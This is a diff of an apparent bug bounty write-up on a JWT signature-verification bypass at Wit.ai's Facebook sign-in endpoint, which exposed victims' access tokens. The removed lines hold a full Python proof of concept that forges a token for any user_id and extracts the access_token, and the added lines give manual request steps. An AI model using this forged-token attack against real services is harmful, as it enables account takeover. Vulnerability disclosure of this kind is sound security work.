@@ -18,7 +18,23 @@ An attacker could impersonate other Facebook users and obtain `access_token` for
 
 ---
 
-## Affected endpoint
+## Vulnerability details
+
+- **Type:** JWT signature verification bypass (HMAC-SHA256)
+- **Root cause:** The server accepted tokens when header and payload looked correct but failed to validate the signature. The `algorithm` field in the JWT payload/header indicated `HMAC-SHA256`, but the implementation did not verify the HMAC signature against the server-side secret.
+- **Impact:** An attacker can craft a JWT with an arbitrary `user_id` and a forged signature (signed with any key) and successfully authenticate as the targeted Facebook user in Wit.ai.
+
+---
+
+## ⚙️ Steps to Reproduce
+
+1) Generate a new token and replace the user_id with the victim's ID. The secret value doesn't matter, put anything, because the signature is not being verified.
+
+![image](https://raw.githubusercontent.com/ramzybouyahya/cdnramzy/main/12546.png)
+
+2) Using the token that is created, send the request, the response will contain the victim's access token, which would allow you full control of the victim's account.
+
+##### Request
 
 ```http
 POST /me/facebook_signin HTTP/1.1
@@ -31,76 +47,14 @@ Connection: close
 &signed_request={JWT_TOKEN}
 ```
 
----
 
-## Vulnerability details
+##### Response
 
-- **Type:** JWT signature verification bypass (HMAC-SHA256)
-- **Root cause:** The server accepted tokens when header and payload looked correct but failed to validate the signature. The `algorithm` field in the JWT payload/header indicated `HMAC-SHA256`, but the implementation did not verify the HMAC signature against the server-side secret.
-- **Impact:** An attacker can craft a JWT with an arbitrary `user_id` and a forged signature (signed with any key) and successfully authenticate as the targeted Facebook user in Wit.ai.
-
----
-
-## ⚙️ Steps to Reproduce
-
-The following Python script demonstrates creating a forged JWT and submitting it to the endpoint. Replace `victim_id` with the target Facebook user id.
-
-```python
-import jwt
-import requests
-import time
-import urllib.parse
-
-# ---------------- CONFIG ----------------
-victim_id = "123456789012345"
-fake_secret = "anything"
-api_url = "https://api.wit.ai/me/facebook_signin"
-
-# ---------------- CREATE FAKE JWT ----------------
-payload = {
-    "user_id": victim_id,
-    "code": "",
-    "algorithm": "HMAC-SHA256",
-    "issued_at": int(time.time())
-}
-
-# Note: using HS256 to sign with arbitrary secret
-token = jwt.encode(payload, fake_secret, algorithm="HS256")
-
-# ---------------- SEND REQUEST (form-encoded) ----------------
-headers = {
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Origin": "https://wit.ai",
-    "Referer": "https://wit.ai",
-    "User-Agent": "Mozilla/5.0",
-    "Accept": "*/*"
-}
-
-data = {
-    "signed_request": token
-}
-
-encoded_data = urllib.parse.urlencode(data)
-
-print("[*] Sending forged JWT (form-encoded)...")
-response = requests.post(api_url, headers=headers, data=encoded_data)
-
-print(f"\n[+] Status Code: {response.status_code}")
-try:
-    json_response = response.json()
-    print("\n[+] Response:")
-    print(json_response)
-
-    if "access_token" in json_response:
-        print(f"\n[+] Extracted Token: t:{json_response['access_token']}")
-    else:
-        print("\n[-] No access_token found.")
-except Exception as e:
-    print("\n[!] Could not decode JSON:")
-    print(response.text)
+```
+TOKEN:"VICTIM_TOKEN"
 ```
 
-**Expected result (before the patch):** the server returns a JSON containing an `access_token` for the targeted `user_id`.
+Expected result (before the patch): the server returns a DATA containing an access_token for the targeted user_id.
 
 ---
 
